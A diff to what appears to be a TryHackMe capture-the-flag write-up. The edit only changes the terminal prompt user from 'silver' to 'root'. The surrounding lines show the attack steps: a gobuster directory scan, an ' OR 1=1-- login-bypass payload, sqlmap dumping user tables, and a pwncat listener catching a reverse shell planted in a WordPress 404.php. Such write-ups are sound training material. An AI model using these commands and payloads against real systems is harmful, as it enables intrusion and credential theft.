@@ -54,7 +54,7 @@ We can see server at port 80
 
 let's dirbust it
 ```terminal
-┌─[✗]─[silver@parrot]─[~]
+┌─[✗]─[root@parrot]─[~]
 └──╼ $gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.30.179
 ===============================================================
 Gobuster v3.0.1
@@ -87,7 +87,7 @@ simple login bypass will work now let's extract out database ' OR 1=1--
 Let's bring sqlmap and dump database
 
 ```terminal
-┌─[silver@parrot]─[~/Desktop/tryhackme/uoeasy]
+┌─[root@parrot]─[~/Desktop/tryhackme/uoeasy]
 └──╼ $sqlmap -u 'http://10.10.123.17/login.php' --dump login --forms
         ___
        __H__
@@ -169,7 +169,7 @@ Table: users
 | Sir       | PopRocks   |
 +-----------+------------+
 
-[04:35:45] [INFO] table 'login.users' dumped to CSV file '/home/silver/.sqlmap/output/10.10.123.17/dump/login/users.csv'
+[04:35:45] [INFO] table 'login.users' dumped to CSV file '/home/root/.sqlmap/output/10.10.123.17/dump/login/users.csv'
 [04:35:45] [INFO] fetching columns for table 'user_name' in database 'login'
 [04:35:45] [INFO] retrieved: 1
 [04:35:54] [INFO] retrieved: user_name
@@ -187,8 +187,8 @@ Table: user_name
 | candyshop |
 +-----------+
 
-[04:43:48] [INFO] table 'login.user_name' dumped to CSV file '/home/silver/.sqlmap/output/10.10.123.17/dump/login/user_name.csv'
-[04:43:48] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/silver/.sqlmap/output/results-08082020_0414am.csv'
+[04:43:48] [INFO] table 'login.user_name' dumped to CSV file '/home/root/.sqlmap/output/10.10.123.17/dump/login/user_name.csv'
+[04:43:48] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/root/.sqlmap/output/results-08082020_0414am.csv'
 
 So there is another database
 
@@ -220,8 +220,8 @@ Table: users
 | admin    |<redacted>
 +----------+---------------------+
 
-[23:44:10] [INFO] table 'wordpress8080.users' dumped to CSV file '/home/silver/.sqlmap/output/10.10.179.109/dump/wordpress8080/users.csv'
-[23:44:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/silver/.sqlmap/output/results-08092020_1137pm.csv'
+[23:44:10] [INFO] table 'wordpress8080.users' dumped to CSV file '/home/root/.sqlmap/output/10.10.179.109/dump/wordpress8080/users.csv'
+[23:44:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/root/.sqlmap/output/results-08092020_1137pm.csv'
 
 [*] ending @ 23:44:10 /2020-08-09/
 ```
@@ -237,7 +237,7 @@ Now to uploaded reverse shell into 404.php.
 let bring up pwncat.
 
 ```terminal
-┌─[silver@parrot]─[~/Desktop/tryhackme/uoeasy]
+┌─[root@parrot]─[~/Desktop/tryhackme/uoeasy]
 └──╼ $pwncat --listen --port 4444
 [23:56:36] received connection from 10.10.179.109:57043                                                                 connect.py:149
 [23:56:39] new host w/ hash 5dd8ea056be4cd05d790067fea4bfccf                                                             victim.py:328
